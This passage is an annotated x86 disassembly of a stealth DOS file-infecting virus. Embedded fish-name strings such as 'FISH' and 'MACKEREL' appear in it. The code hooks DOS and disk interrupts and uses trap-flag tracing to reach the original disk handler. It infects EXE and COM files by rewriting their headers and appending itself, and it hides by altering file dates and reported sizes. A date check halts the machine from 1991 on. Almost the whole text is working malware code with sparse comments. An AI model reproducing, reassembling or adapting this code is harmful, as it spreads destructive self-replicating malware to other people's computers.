075C E8 5D FA                CALL 01BC                  ; Set Stack & PushA.
075F E8 80 FA                CALL 01E2                  ; Swap Jump To INT 21
0762 E8 32 FA                CALL 0197                  ; Set Stack & PopA.
0765 8E DB                   MOV DS,BX
0767 8E C3                   MOV ES,BX
0769 2E FF 36 B3 0E          CS PUSH W[0EB3]
076E 2E FF 36 E8 0E          CS PUSH W[0EE8]
0773 2E FF 36 E6 0E          CS PUSH W[0EE6]
0778 8F 06 0A 00             POP W[0A]
077C 8F 06 0C 00             POP W[0C]
0780 1E                      PUSH DS
0781 B0 22                   MOV AL,022
0783 C5 16 0A 00             LDS DX,[0A]
0787 E8 80 FA                CALL 020A                  ; Set INT #22 to DS:DX.
078A 1F                      POP DS
078B 9D                      POPF
078C 58                      POP AX
078D 2E 8B 26 FF 0E          CS MOV SP,W[0EFF]
0792 2E 8E 16 01 0F          CS MOV SS,W[0F01]
0797 2E FF 2E 03 0F          CS JMP D[0F03]
079C 53                      PUSH BX
079D 4F                      DEC DI
079E 4C                      DEC SP
079F 45                      INC BP
07A0 8B 5C 01                MOV BX,W[SI+1]
07A3 8B 80 39 F2             MOV AX,W[BX+SI+0F239]
07A7 89 04                   MOV W[SI],AX
07A9 8B 80 3B F2             MOV AX,W[BX+SI+0F23B]
07AD 89 44 02                MOV W[SI+2],AX
07B0 8B 80 3D F2             MOV AX,W[BX+SI+0F23D]
07B4 89 44 04                MOV W[SI+4],AX
07B7 E8 D7 03                CALL 0B91
07BA EB 9B                   JMP 0757
07BC 3C 01                   CMP AL,1
07BE 74 03                   JE 07C3
07C0 E9 9B FC                JMP 045E
07C3 2E 83 0E B3 0E 01       CS OR W[0EB3],1
07C9 2E 8C 06 26 0E          CS MOV W[0E26],ES
07CE 2E 89 1E 24 0E          CS MOV W[0E24],BX
07D3 E8 A9 F9                CALL 017F                  ; Pop All Registers.
07D6 E8 88 F9                CALL 0161                  ; INT 21
07D9 E8 90 F9                CALL 016C                  ; Push All Registers.
07DC 2E C4 1E 24 0E          CS LES BX,[0E24]
07E1 26 C5 77 12             ES LDS SI,[BX+012]
07E5 72 74                   JB 085B
07E7 2E 80 26 B3 0E FE       CS AND B[0EB3],0FE
07ED 83 FE 01                CMP SI,1
07F0 74 29                   JE 081B
07F2 8B 04                   MOV AX,W[SI]
07F4 03 44 02                ADD AX,W[SI+2]
07F7 53                      PUSH BX
07F8 8B 5C 04                MOV BX,W[SI+4]
07FB F7 D3                   NOT BX
07FD 01 D8                   ADD AX,BX
07FF 5B                      POP BX
0800 75 45                   JNE 0847
0802 8B 5C 01                MOV BX,W[SI+1]
0805 8B 80 39 F2             MOV AX,W[BX+SI+0F239]
0809 89 04                   MOV W[SI],AX
080B 8B 80 3B F2             MOV AX,W[BX+SI+0F23B]
080F 89 44 02                MOV W[SI+2],AX
0812 8B 80 3D F2             MOV AX,W[BX+SI+0F23D]
0816 89 44 04                MOV W[SI+4],AX
0819 EB 2C                   JMP 0847
081B 8B 16 1A 00             MOV DX,W[01A]
081F E8 32 02                CALL 0A54
0822 2E 8B 0E A3 0E          CS MOV CX,W[0EA3]
0827 83 C1 10                ADD CX,010
082A 01 CA                   ADD DX,CX
082C 26 89 57 14             ES MOV W[BX+014],DX
0830 A1 18 00                MOV AX,W[018]
0833 26 89 47 12             ES MOV W[BX+012],AX
0837 A1 12 00                MOV AX,W[012]
083A 03 C1                   ADD AX,CX
083C 26 89 47 10             ES MOV W[BX+010],AX
0840 A1 14 00                MOV AX,W[014]
0843 26 89 47 0E             ES MOV W[BX+0E],AX
0847 E8 0A 02                CALL 0A54
084A 2E 8E 1E A3 0E          CS MOV DS,W[0EA3]
084F 8B 46 02                MOV AX,W[BP+2]
0852 A3 0A 00                MOV W[0A],AX
0855 8B 46 04                MOV AX,W[BP+4]
0858 A3 0C 00                MOV W[0C],AX
085B E9 63 FC                JMP 04C1
085E 46                      INC SI
085F 49                      DEC CX
0860 53                      PUSH BX
0861 48                      DEC AX
0862 E8 AB 04                CALL 0D10
0865 E8 DC 00                CALL 0944
0868 C6 06 20 00 01          MOV B[020],1
086D 81 3E 00 0E 4D 5A       CMP W[0E00],05A4D
0873 74 0E                   JE 0883
0875 81 3E 00 0E 5A 4D       CMP W[0E00],04D5A
087B 74 06                   JE 0883
087D FE 0E 20 00             DEC B[020]
0881 74 58                   JE 08DB
0883 A1 04 0E                MOV AX,W[0E04]
0886 D1 E1                   SHL CX,1
0888 F7 E1                   MUL CX
088A 05 00 02                ADD AX,0200
088D 39 F0                   CMP AX,SI
088F 72 48                   JB 08D9
0891 A1 0A 0E                MOV AX,W[0E0A]
0894 0B 06 0C 0E             OR AX,W[0E0C]
0898 74 3F                   JE 08D9
089A 8B 16 AB 0E             MOV DX,W[0EAB]
089E B9 00 02                MOV CX,0200
08A1 A1 A9 0E                MOV AX,W[0EA9]
08A4 F7 F1                   DIV CX
08A6 0B D2                   OR DX,DX
08A8 74 01                   JE 08AB
08AA 40                      INC AX
08AB 89 16 02 0E             MOV W[0E02],DX
08AF A3 04 0E                MOV W[0E04],AX
08B2 83 3E 14 0E 01          CMP W[0E14],1
08B7 74 6D                   JE 0926
08B9 C7 06 14 0E 01 00       MOV W[0E14],1
08BF 8B C6                   MOV AX,SI
08C1 2B 06 08 0E             SUB AX,W[0E08]
08C5 A3 16 0E                MOV W[0E16],AX
08C8 83 06 04 0E 07          ADD W[0E04],7
08CD C7 06 10 0E 00 0E       MOV W[0E10],0E00
08D3 A3 0E 0E                MOV W[0E0E],AX
08D6 E8 CD 00                CALL 09A6
08D9 EB 4B                   JMP 0926
08DB 81 FE 00 0F             CMP SI,0F00
08DF 73 45                   JAE 0926
08E1 A1 00 0E                MOV AX,W[0E00]
08E4 A3 04 00                MOV W[4],AX
08E7 01 C2                   ADD DX,AX
08E9 A1 02 0E                MOV AX,W[0E02]
08EC A3 06 00                MOV W[6],AX
08EF 01 C2                   ADD DX,AX
08F1 A1 04 0E                MOV AX,W[0E04]
08F4 A3 08 00                MOV W[8],AX
08F7 F7 D0                   NOT AX
08F9 01 C2                   ADD DX,AX
08FB 74 29                   JE 0926
08FD A1 F2 0E                MOV AX,W[0EF2]
0900 24 04                   AND AL,4
0902 75 22                   JNE 0926
0904 B1 E9                   MOV CL,0E9
0906 B8 10 00                MOV AX,010
0909 88 0E 00 0E             MOV B[0E00],CL
090D F7 E6                   MUL SI
090F 05 CB 0D                ADD AX,0DCB
0912 A3 01 0E                MOV W[0E01],AX
0915 A1 00 0E                MOV AX,W[0E00]
0918 03 06 02 0E             ADD AX,W[0E02]
091C F7 D8                   NEG AX
091E F7 D0                   NOT AX
0920 A3 04 0E                MOV W[0E04],AX
0923 E8 80 00                CALL 09A6
0926 B4 3E                   MOV AH,03E
0928 E8 36 F8                CALL 0161                  ; INT 21
092B 2E 8B 0E F2 0E          CS MOV CX,W[0EF2]
0930 B8 01 43                MOV AX,04301
0933 2E 8B 16 F4 0E          CS MOV DX,W[0EF4]
0938 2E 8E 1E F6 0E          CS MOV DS,W[0EF6]
093D E8 21 F8                CALL 0161                  ; INT 21
0940 E8 4D 04                CALL 0D90
0943 C3                      RET
0944 0E                      PUSH CS
0945 B8 00 57                MOV AX,05700
0948 1F                      POP DS
0949 E8 15 F8                CALL 0161                  ; INT 21
094C 89 0E 29 0E             MOV W[0E29],CX
0950 B8 00 42                MOV AX,04200
0953 89 16 2B 0E             MOV W[0E2B],DX
0957 33 C9                   XOR CX,CX
0959 33 D2                   XOR DX,DX
095B E8 03 F8                CALL 0161                  ; INT 21
095E B4 3F                   MOV AH,03F
0960 BA 00 0E                MOV DX,0E00
0963 B1 1C                   MOV CL,01C
0965 E8 F9 F7                CALL 0161                  ; INT 21
0968 33 C9                   XOR CX,CX
096A B8 00 42                MOV AX,04200
096D 33 D2                   XOR DX,DX
096F E8 EF F7                CALL 0161                  ; INT 21
0972 B1 1C                   MOV CL,01C
0974 B4 3F                   MOV AH,03F
0976 BA 04 00                MOV DX,4
0979 E8 E5 F7                CALL 0161                  ; INT 21
097C 33 C9                   XOR CX,CX
097E B8 02 42                MOV AX,04202
0981 8B D1                   MOV DX,CX
0983 E8 DB F7                CALL 0161                  ; INT 21
0986 89 16 AB 0E             MOV W[0EAB],DX
098A A3 A9 0E                MOV W[0EA9],AX
098D 8B F8                   MOV DI,AX
098F 05 0F 00                ADD AX,0F
0992 83 D2 00                ADC DX,0
0995 25 F0 FF                AND AX,-010
0998 29 C7                   SUB DI,AX
099A B9 10 00                MOV CX,010
099D F7 F1                   DIV CX
099F 8B F0                   MOV SI,AX
09A1 C3                      RET
09A2 50                      PUSH AX
09A3 49                      DEC CX
09A4 4B                      DEC BX
09A5 45                      INC BP
09A6 33 C9                   XOR CX,CX
09A8 B8 00 42                MOV AX,04200
09AB 8B D1                   MOV DX,CX
09AD E8 B1 F7                CALL 0161                  ; INT 21
09B0 B1 1C                   MOV CL,01C
09B2 B4 40                   MOV AH,040
09B4 BA 00 0E                MOV DX,0E00
09B7 E8 A7 F7                CALL 0161                  ; INT 21
09BA B8 10 00                MOV AX,010
09BD F7 E6                   MUL SI
09BF 8B CA                   MOV CX,DX
09C1 8B D0                   MOV DX,AX
09C3 B8 00 42                MOV AX,04200
09C6 E8 98 F7                CALL 0161                  ; INT 21
09C9 B9 00 0E                MOV CX,0E00
09CC 33 D2                   XOR DX,DX
09CE 01 F9                   ADD CX,DI
09D0 B4 40                   MOV AH,040
09D2 2E C6 06 33 0E 01       CS MOV B[0E33],1
09D8 53                      PUSH BX
09D9 E8 DD 04                CALL 0EB9
09DC 5B                      POP BX
09DD 8B 0E 29 0E             MOV CX,W[0E29]
09E1 B8 01 57                MOV AX,05701
09E4 8B 16 2B 0E             MOV DX,W[0E2B]
09E8 F6 C6 80                TEST DH,080
09EB 75 03                   JNE 09F0
09ED 80 C6 C8                ADD DH,0C8
09F0 E8 6E F7                CALL 0161                  ; INT 21
09F3 C3                      RET
09F4 E8 C5 F7                CALL 01BC                  ; Set Stack & PushA.
09F7 89 D7                   MOV DI,DX
09F9 83 C7 0D                ADD DI,0D
09FC 1E                      PUSH DS
09FD 07                      POP ES
09FE EB 20                   JMP 0A20
0A00 E8 B9 F7                CALL 01BC                  ; Set Stack & PushA.
0A03 1E                      PUSH DS
0A04 07                      POP ES
0A05 B9 50 00                MOV CX,050
0A08 89 D7                   MOV DI,DX
0A0A B3 00                   MOV BL,0
0A0C 33 C0                   XOR AX,AX
0A0E 80 7D 01 3A             CMP B[DI+1],03A
0A12 75 05                   JNE 0A19
0A14 8A 1D                   MOV BL,B[DI]
0A16 80 E3 1F                AND BL,01F
0A19 2E 88 1E 28 0E          CS MOV B[0E28],BL
0A1E F2 AE                   REPNE SCASB
0A20 8B 45 FD                MOV AX,W[DI-3]
0A23 25 DF DF                AND AX,0DFDF
0A26 02 E0                   ADD AH,AL
0A28 8A 45 FC                MOV AL,B[DI-4]
0A2B 24 DF                   AND AL,0DF
0A2D 02 C4                   ADD AL,AH
0A2F 2E C6 06 20 00 00       CS MOV B[020],0
0A35 3C DF                   CMP AL,0DF
0A37 74 09                   JE 0A42
0A39 2E FE 06 20 00          CS INC B[020]
0A3E 3C E2                   CMP AL,0E2
0A40 75 0D                   JNE 0A4F
0A42 E8 52 F7                CALL 0197                  ; Set Stack & PopA.
0A45 F8                      CLC
0A46 C3                      RET
0A47 4D                      DEC BP
0A48 41                      INC CX
0A49 43                      INC BX
0A4A 4B                      DEC BX
0A4B 45                      INC BP
0A4C 52                      PUSH DX
0A4D 45                      INC BP
0A4E 4C                      DEC SP
0A4F E8 45 F7                CALL 0197                  ; Set Stack & PopA.
0A52 F9                      STC
0A53 C3                      RET
0A54 53                      PUSH BX
0A55 B4 51                   MOV AH,051
0A57 E8 07 F7                CALL 0161                  ; INT 21
0A5A 2E 89 1E A3 0E          CS MOV W[0EA3],BX
0A5F 5B                      POP BX
0A60 C3                      RET
0A61 E8 AC 02                CALL 0D10
0A64 52                      PUSH DX
0A65 B4 36                   MOV AH,036
0A67 2E 8A 16 28 0E          CS MOV DL,B[0E28]
0A6C E8 F2 F6                CALL 0161                  ; INT 21
0A6F F7 E1                   MUL CX
0A71 F7 E3                   MUL BX
0A73 89 D3                   MOV BX,DX
0A75 5A                      POP DX
0A76 0B DB                   OR BX,BX
0A78 75 05                   JNE 0A7F
0A7A 3D 00 40                CMP AX,04000
0A7D 72 48                   JB 0AC7
0A7F B8 00 43                MOV AX,04300
0A82 E8 DC F6                CALL 0161                  ; INT 21
0A85 72 40                   JB 0AC7
0A87 2E 89 16 F4 0E          CS MOV W[0EF4],DX
0A8C 2E 89 0E F2 0E          CS MOV W[0EF2],CX
0A91 2E 8C 1E F6 0E          CS MOV W[0EF6],DS
0A96 B8 01 43                MOV AX,04301
0A99 33 C9                   XOR CX,CX
0A9B E8 C3 F6                CALL 0161                  ; INT 21
0A9E 2E 80 3E DA 0E 00       CS CMP B[0EDA],0
0AA4 75 21                   JNE 0AC7
0AA6 B8 02 3D                MOV AX,03D02
0AA9 E8 B5 F6                CALL 0161                  ; INT 21
0AAC 72 19                   JB 0AC7
0AAE 8B D8                   MOV BX,AX
0AB0 53                      PUSH BX
0AB1 B4 32                   MOV AH,032
0AB3 2E 8A 16 28 0E          CS MOV DL,B[0E28]
0AB8 E8 A6 F6                CALL 0161                  ; INT 21
0ABB 8B 47 1E                MOV AX,W[BX+01E]
0ABE 2E A3 EC 0E             CS MOV W[0EEC],AX
0AC2 5B                      POP BX
0AC3 E8 CA 02                CALL 0D90
0AC6 C3                      RET
0AC7 33 DB                   XOR BX,BX
0AC9 4B                      DEC BX
0ACA E8 C3 02                CALL 0D90
0ACD C3                      RET
0ACE 51                      PUSH CX
0ACF 52                      PUSH DX
0AD0 50                      PUSH AX
0AD1 B8 00 44                MOV AX,04400
0AD4 E8 8A F6                CALL 0161                  ; INT 21
0AD7 80 F2 80                XOR DL,080
0ADA F6 C2 80                TEST DL,080
0ADD 74 09                   JE 0AE8
0ADF B8 00 57                MOV AX,05700
0AE2 E8 7C F6                CALL 0161                  ; INT 21
0AE5 F6 C6 80                TEST DH,080
0AE8 58                      POP AX
0AE9 5A                      POP DX
0AEA 59                      POP CX
0AEB C3                      RET
0AEC E8 CD F6                CALL 01BC                  ; Set Stack & PushA.
0AEF 33 C9                   XOR CX,CX
0AF1 B8 01 42                MOV AX,04201
0AF4 33 D2                   XOR DX,DX
0AF6 E8 68 F6                CALL 0161                  ; INT 21
0AF9 2E 89 16 A7 0E          CS MOV W[0EA7],DX
0AFE 2E A3 A5 0E             CS MOV W[0EA5],AX
0B02 B8 02 42                MOV AX,04202
0B05 33 C9                   XOR CX,CX
0B07 33 D2                   XOR DX,DX
0B09 E8 55 F6                CALL 0161                  ; INT 21
0B0C 2E 89 16 AB 0E          CS MOV W[0EAB],DX
0B11 2E A3 A9 0E             CS MOV W[0EA9],AX
0B15 B8 00 42                MOV AX,04200
0B18 2E 8B 16 A5 0E          CS MOV DX,W[0EA5]
0B1D 2E 8B 0E A7 0E          CS MOV CX,W[0EA7]
0B22 E8 3C F6                CALL 0161                  ; INT 21
0B25 E8 6F F6                CALL 0197                  ; Set Stack & PopA.
0B28 C3                      RET
0B29 46                      INC SI
0B2A 49                      DEC CX
0B2B 53                      PUSH BX
0B2C 48                      DEC AX
0B2D 0A C0                   OR AL,AL
0B2F 75 22                   JNE 0B53
0B31 2E 83 26 B3 0E FE       CS AND W[0EB3],-2
0B37 E8 45 F6                CALL 017F                  ; Pop All Registers.
0B3A E8 24 F6                CALL 0161                  ; INT 21
0B3D 72 0B                   JB 0B4A
0B3F F6 C6 80                TEST DH,080
0B42 74 03                   JE 0B47
0B44 80 EE C8                SUB DH,0C8
0B47 E9 18 F9                JMP 0462
0B4A 2E 83 0E B3 0E 01       CS OR W[0EB3],1
0B50 E9 0F F9                JMP 0462
0B53 3C 01                   CMP AL,1
0B55 75 37                   JNE 0B8E
0B57 2E 83 26 B3 0E FE       CS AND W[0EB3],-2
0B5D F6 C6 80                TEST DH,080
0B60 74 03                   JE 0B65
0B62 80 EE C8                SUB DH,0C8
0B65 E8 66 FF                CALL 0ACE
0B68 74 03                   JE 0B6D
0B6A 80 C6 C8                ADD DH,0C8
0B6D E8 F1 F5                CALL 0161                  ; INT 21
0B70 89 46 FC                MOV W[BP-4],AX
0B73 2E 83 16 B3 0E 00       CS ADC W[0EB3],0
0B79 E9 45 F9                JMP 04C1
0B7C 3C 02                   CMP AL,2
0B7E 75 0E                   JNE 0B8E
0B80 E8 4B FF                CALL 0ACE
0B83 74 09                   JE 0B8E
0B85 81 6E F6 00 0E          SUB W[BP-0A],0E00
0B8A 83 5E F8 00             SBB W[BP-8],0
0B8E E9 CD F8                JMP 045E
0B91 E8 D8 F5                CALL 016C                  ; Push All Registers.
0B94 B4 2A                   MOV AH,02A
0B96 E8 C8 F5                CALL 0161                  ; INT 21
0B99 81 F9 C7 07             CMP CX,07C7
0B9D 72 0B                   JB 0BAA
0B9F B4 09                   MOV AH,9
0BA1 0E                      PUSH CS
0BA2 1F                      POP DS
0BA3 BA AB 01                MOV DX,01AB
0BA6 E8 B8 F5                CALL 0161                  ; INT 21
0BA9 F4                      HLT
0BAA E8 D2 F5                CALL 017F                  ; Pop All Registers.
0BAD C3                      RET
0BAE 2E 80 26 B3 0E FE       CS AND B[0EB3],0FE
0BB4 E8 17 FF                CALL 0ACE
0BB7 74 D5                   JE 0B8E
0BB9 2E 89 16 AD 0E          CS MOV W[0EAD],DX
0BBE 2E 89 0E AF 0E          CS MOV W[0EAF],CX
0BC3 2E C7 06 B1 0E 00 00    CS MOV W[0EB1],0
0BCA E8 1F FF                CALL 0AEC
0BCD 2E A1 A9 0E             CS MOV AX,W[0EA9]
0BD1 2E 8B 16 AB 0E          CS MOV DX,W[0EAB]
0BD6 2D 00 0E                SUB AX,0E00
0BD9 83 DA 00                SBB DX,0
0BDC 2E 2B 06 A5 0E          CS SUB AX,W[0EA5]
0BE1 2E 1B 16 A7 0E          CS SBB DX,W[0EA7]
0BE6 79 08                   JNS 0BF0
0BE8 C7 46 FC 00 00          MOV W[BP-4],0
0BED E9 2D FA                JMP 061D
0BF0 75 08                   JNE 0BFA
0BF2 3B C1                   CMP AX,CX
0BF4 77 04                   JA 0BFA
0BF6 2E A3 AF 0E             CS MOV W[0EAF],AX
0BFA 2E 8B 0E A7 0E          CS MOV CX,W[0EA7]
0BFF 2E 8B 16 A5 0E          CS MOV DX,W[0EA5]
0C04 0B C9                   OR CX,CX
0C06 75 05                   JNE 0C0D
0C08 83 FA 1C                CMP DX,01C
0C0B 76 1A                   JBE 0C27
0C0D 2E 8B 16 AD 0E          CS MOV DX,W[0EAD]
0C12 B4 3F                   MOV AH,03F
0C14 2E 8B 0E AF 0E          CS MOV CX,W[0EAF]
0C19 E8 45 F5                CALL 0161                  ; INT 21
0C1C 2E 03 06 B1 0E          CS ADD AX,W[0EB1]
0C21 89 46 FC                MOV W[BP-4],AX
0C24 E9 9A F8                JMP 04C1
0C27 89 D7                   MOV DI,DX
0C29 89 D6                   MOV SI,DX                  ;
0C2B 2E 03 3E AF 0E          CS ADD DI,W[0EAF]
0C30 83 FF 1C                CMP DI,01C
0C33 72 08                   JB 0C3D
0C35 33 FF                   XOR DI,DI
0C37 EB 09                   JMP 0C42
0C39 54                      PUSH SP
0C3A 55                      PUSH BP
0C3B 4E                      DEC SI
0C3C 41                      INC CX
0C3D 83 EF 1C                SUB DI,01C
0C40 F7 DF                   NEG DI
0C42 8B C2                   MOV AX,DX
0C44 2E 8B 16 A9 0E          CS MOV DX,W[0EA9]
0C49 2E 8B 0E AB 0E          CS MOV CX,W[0EAB]
0C4E 83 C2 0F                ADD DX,0F
0C51 83 D1 00                ADC CX,0
0C54 83 E2 F0                AND DX,-010
0C57 81 EA FC 0D             SUB DX,0DFC
0C5B 83 D9 00                SBB CX,0
0C5E 01 C2                   ADD DX,AX
0C60 83 D1 00                ADC CX,0
0C63 B8 00 42                MOV AX,04200
0C66 E8 F8 F4                CALL 0161                  ; INT 21
0C69 B9 1C 00                MOV CX,01C
0C6C 29 F9                   SUB CX,DI
0C6E 29 F1                   SUB CX,SI
0C70 B4 3F                   MOV AH,03F
0C72 2E 8B 16 AD 0E          CS MOV DX,W[0EAD]
0C77 E8 E7 F4                CALL 0161                  ; INT 21
0C7A 2E 01 06 AD 0E          CS ADD W[0EAD],AX
0C7F 2E 29 06 AF 0E          CS SUB W[0EAF],AX
0C84 2E 01 06 B1 0E          CS ADD W[0EB1],AX
0C89 33 C9                   XOR CX,CX
0C8B B8 00 42                MOV AX,04200
0C8E BA 1C 00                MOV DX,01C
0C91 E8 CD F4                CALL 0161                  ; INT 21
0C94 E9 76 FF                JMP 0C0D

                      ; Jumped Here After Decrementing/Incrementing [0E31](0F71)

0C97 2E 21 26 31 0E          CS AND W[0E31],SP          ; [0E31]&=FFFE
0C9C E9 38 01                JMP 0DD7                   ;  0DD7 (0C97)

0C9F 2E 83 26 B3 0E FE       CS AND W[0EB3],-2
0CA5 E8 D7 F4                CALL 017F                  ; Pop All Registers.
0CA8 E8 B6 F4                CALL 0161                  ; INT 21
0CAB E8 BE F4                CALL 016C                  ; Push All Registers.
0CAE 73 09                   JAE 0CB9
0CB0 2E 83 0E B3 0E 01       CS OR W[0EB3],1
0CB6 E9 08 F8                JMP 04C1
0CB9 E8 99 F9                CALL 0655
0CBC F6 47 19 80             TEST B[BX+019],080
0CC0 75 03                   JNE 0CC5
0CC2 E9 FC F7                JMP 04C1
0CC5 81 6F 1A 00 0E          SUB W[BX+01A],0E00
0CCA 83 5F 1C 00             SBB W[BX+01C],0
0CCE 80 6F 19 C8             SUB B[BX+019],0C8
0CD2 E9 EC F7                JMP 04C1
0CD5 EB 8E                   JMP 0C65
0CD7 06                      PUSH ES
0CD8 45                      INC BP
0CD9 0E                      PUSH CS
0CDA 06                      PUSH ES
0CDB 1F                      POP DS
0CDC FE 0E 03 00             DEC B[3]
0CE0 8C DA                   MOV DX,DS
0CE2 4A                      DEC DX
0CE3 8E DA                   MOV DS,DX
0CE5 A1 03 00                MOV AX,W[3]
0CE8 FE CC                   DEC AH
0CEA 01 C2                   ADD DX,AX
0CEC A3 03 00                MOV W[3],AX
0CEF 5F                      POP DI
0CF0 42                      INC DX
0CF1 8E C2                   MOV ES,DX
0CF3 0E                      PUSH CS
0CF4 1F                      POP DS
0CF5 E8 DF 00                CALL 0DD7                  ; Skeep One Byte
                                                        ; Byte Skeeped
0CF8 A1 BE FE                MOV AX,W[0FEBE]
0CFB 0F B9                   DB 0F,0B9
0CFD 00 08                   ADD B[BX+SI],CL
0CFF 89 F7                   MOV DI,SI
0D01 FD                      STD
0D02 F3 A5                   REP MOVSW
0D04 FC                      CLD
0D05 06                      PUSH ES
0D06 B8 DD 01                MOV AX,01DD
0D09 50                      PUSH AX
0D0A 2E 8E 06 45 0E          CS MOV ES,W[0E45]
0D0F CB                      RETF

                        ; Subrutine.

0D10 2E C6 06 DA 0E 00       CS MOV B[0EDA],0
0D16 E8 A3 F4                CALL 01BC                  ; Set Stack & PushA.
0D19 0E                      PUSH CS                    ;
0D1A E8 7A FF                CALL 0C97                  ; Make [0E31] Random
0D1D 88                                                 ; Skeep One Byte
0D1E B0 13                   MOV AL,13                  ; AL=13
0D20 1F                      POP DS                     ; DS=CS
0D21 E8 FC F4                CALL 0220                  ; ES:BX -> INT #13
0D24 8C 06 2F 0E             MOV W[0E2F],ES             ;
0D28 89 1E 2D 0E             MOV W[0E2D],BX             ; [0E2D] = INT 13 Ptr
0D2C 8C 06 3B 0E             MOV W[0E3B],ES             ; [0E3B] = INT 13 Seg
0D30 B2 02                   MOV DL,2                   ; DL=02
0D32 89 1E 39 0E             MOV W[0E39],BX             ; [0E39] = INT 13 Ptr
0D36 88 16 50 0E             MOV B[0E50],DL             ; [0E50] = 02
0D3A E8 C2 F4                CALL 01FF                  ; INT 01 -> CS:0CB7(0DF7
0D3D 89 26 DF 0E             MOV W[0EDF],SP             ; [0EDF] = SP
0D41 8C 16 DD 0E             MOV W[0EDD],SS             ; [0EDD] = SS
0D45 0E                      PUSH CS                    ;
0D46 B8 29 0C                MOV AX,0C29                ; AX = 0C29
0D49 50                      PUSH AX                    ; Stack = CS:0C29
0D4A B8 70 00                MOV AX,070                 ; AX = 0070
0D4D B9 FF FF                MOV CX,-1                  ; CS = FFFF
0D50 8E C0                   MOV ES,AX                  ; ES = 0070
0D52 33 FF                   XOR DI,DI                  ; DI = 0000
0D54 B0 CB                   MOV AL,0CB                 ; AL = CB (RETF)
0D56 F2 AE                   REPNE SCASB                ; Search A RETF In DOS
0D58 4F                      DEC DI                     ; Area. ES:DI -> RETF
0D59 9C                      PUSHF                      ;
0D5A 06                      PUSH ES                    ; ES = RETF Seg (0070)
0D5B 57                      PUSH DI                    ; DI = RETF Ofs
0D5C 9C                      PUSHF                      ;
0D5D 58                      POP AX                     ;
0D5E 80 CC 01                OR AH,1                    ;
0D61 50                      PUSH AX                    ;
0D62 9D                      POPF                       ; Set Trap Flag
0D63 33 C0                   XOR AX,AX                  ;
0D65 FF 2E 2D 0E             JMP D[0E2D]                ; (*)Jump INT 13
0D69 0E                      PUSH CS
0D6A 1F                      POP DS
0D6B E8 69 00                CALL 0DD7                  ; Skeep One Byte
0D6E 8C                                                 ; Byte Skeeped
0D6F B0 13                   MOV AL,13                  ;
0D73 BA 90 0D                MOV DX,0D90                ;
0D74 E8 93 F4                CALL 020A                  ; Set INT #13 to CS:0D90
0D77 B0 24                   MOV AL,024                 ;
0D79 E8 A4 F4                CALL 0220                  ; ES:BX -> INT #24
0D7C 89 1E 3D 0E             MOV W[0E3D],BX
0D80 BA C5 0D                MOV DX,0DC5
0D83 B0 24                   MOV AL,024
0D85 8C 06 3F 0E             MOV W[0E3F],ES
0D89 E8 7E F4                CALL 020A                  ; Set INT #24 to DS:DX.
0D8C E8 08 F4                CALL 0197                  ; Set Stack & PopA.
0D8F C3                      RET
0D90 E8 29 F4                CALL 01BC                  ; Set Stack & PushA.
0D93 2E C5 16 39 0E          CS LDS DX,[0E39]
0D98 B0 13                   MOV AL,013
0D9A E8 6D F4                CALL 020A                  ; Set INT #13 to DS:DX.
0D9D 2E C5 16 3D 0E          CS LDS DX,[0E3D]
0DA2 B0 24                   MOV AL,024
0DA4 E8 63 F4                CALL 020A                  ; Set INT #24 to DS:DX.
0DA7 E8 ED F3                CALL 0197                  ; Set Stack & PopA.
0DAA C3                      RET

                        ; Interrupt Sub-Rutine For INT 01

0DAB 55                      PUSH BP                    ; Save BP
0DAC 89 E5                   MOV BP,SP                  ; BP=SP
0DAE 81 66 06 FF FE          AND W[BP+6],0FEFF          ; Clear Trap Flag
0DB3 FF 46 1A                INC W[BP+01A]              ; Increment Return
                                                        ; Addres After PushA
0DB6 5D                      POP BP                     ; Restore BP
0DB7 CF                      IRET                       ; Return

0DB8 2E C7 06 50 0E 01 04    CS MOV W[0E50],0401
0DBF E8 3D F4                CALL 01FF                  ; INT 01 -> CS:0CB7(0DF7
0DC2 E8 BA F3                CALL 017F                  ; Pop All Registers.
0DC5 50                      PUSH AX
0DC6 2E A1 B3 0E             CS MOV AX,W[0EB3]
0DCA 0D 00 01                OR AX,0100
0DCD 50                      PUSH AX
0DCE 9D                      POPF
0DCF 58                      POP AX
0DD0 5D                      POP BP
0DD1 2E FF 2E 35 0E          CS JMP D[0E35]
0DD6 89

0DD7 E8 92 F3                CALL 016C                  ; Push All Registers.
0DDA B0 01                   MOV AL,1                   ; AL=01
0DDC BA 6B 0C                MOV DX,0C6B                ; DX=0C6B (0DAB)
0DDF 0E                      PUSH CS                    ;
0DE0 1F                      POP DS                     ; DS=CS
0DE1 E8 26 F4                CALL 020A                  ; Set INT 01 to CS:0DAB.
0DE4 9C                      PUSHF                      ;
0DE5 58                      POP AX                     ;
0DE6 0D 00 01                OR AX,0100                 ;
0DE9 50                      PUSH AX                    ; Set Trap Flag.
0DEA 9D                      POPF                       ; Go On On INT 01 ISR
0DEB 40                      INC AX                     ; AX++
0DEC F7 E0                   MUL AX                     ; AX**
0DEE 37                      AAA                        ; AX=BCD(AL)
0DEF A3 31 0E                MOV W[0E31],AX             ; [0E31]=BCD(AL)
0DF2 E8 8A F3                CALL 017F                  ; Pop All Registers.
0DF5 C3                      RET                        ; Will Return To The
                                                        ; Next Byte it Should
0DF6 FF

                        ; Interrupt Sub-Rutine For INT 01

0DF7 55                      PUSH BP                    ; Save BP
0DF8 89 E5                   MOV BP,SP                  ; BP = SP
0DFA 50                      PUSH AX                    ; Save AX
0DFB 81 7E 04 00 C0          CMP W[BP+4],0C000          ; Return Segment
0E00 73 0C                   JAE 0E0E                   ; Ret Seg >= C000 ? 
0E02 2E A1 47 0E             CS MOV AX,W[0E47]          ; AX = First MCB Segment
0E06 39 46 04                CMP W[BP+4],AX             ; Return Segment
0E09 76 03                   JBE 0E0E                   ; Ret Seg <= 1� MSB ? 
0E0B 58                      POP AX                     ; Restore AX
0E0C 5D                      POP BP                     ; Restore BP
0E0D CF                      IRET                       ; Return
                                                        ; Here if Segment > C000
                                                        ; Or Segment < First MCB
0E0E 2E 80 3E 50 0E 01       CS CMP B[0E50],1           ;
0E14 74 26                   JE 0E3C                    ; [0E50]=1 ?  0E3C
0E16 8B 46 04                MOV AX,W[BP+4]             ; AX = Return Segment
0E19 2E A3 2F 0E             CS MOV W[0E2F],AX          ; (*)[0E2F] = Return Segmnt
0E1D 8B 46 02                MOV AX,W[BP+2]             ; AX = Reutnr Offset
0E20 2E A3 2D 0E             CS MOV W[0E2D],AX          ; [0E2D] = Return Offset
0E24 72 0F                   JB 0E35                    ; [0E50]=0 ?  Return
                                                        ; Here If [0E50] = 2
